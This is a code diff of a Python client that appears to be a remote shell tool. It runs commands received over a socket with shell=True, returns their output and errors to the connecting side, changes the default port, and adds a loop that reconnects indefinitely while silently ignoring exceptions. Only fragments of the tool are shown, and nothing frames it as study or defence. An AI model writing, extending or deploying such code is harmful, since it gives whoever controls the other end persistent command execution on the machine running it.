@@ -63,8 +63,8 @@ class Client:
         response = {"data": str(), "error": str()}
         try:
             process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
-            data = process.stdout.read() + process.stderr.read()
-            response["data"] = data
+            response["data"] = process.stdout.read()
+            response["error"] = "[-] " + process.stderr.read()
         except UnicodeDecodeError:
             response["error"] = "[-] UnicodeDecodeError"
         self.connection.send(self.enc_response(response), self.connection.sock)
@@ -158,7 +158,7 @@ class Connection:
         self.PACKET_SIZE = 1024
 
         HOST = "127.0.0.1"
-        PORT = 10000
+        PORT = 10001
 
         if len(sys.argv) == 3:
             try:
@@ -189,9 +189,9 @@ class Connection:
 
 if __name__ == "__main__":
     while True:
-        #try:
-        client = Client()
-            #if client.exit:
-                #break
-        #except:
-            #pass
+        try:
+            client = Client()
+            if client.exit:
+                break
+        except:
+            pass
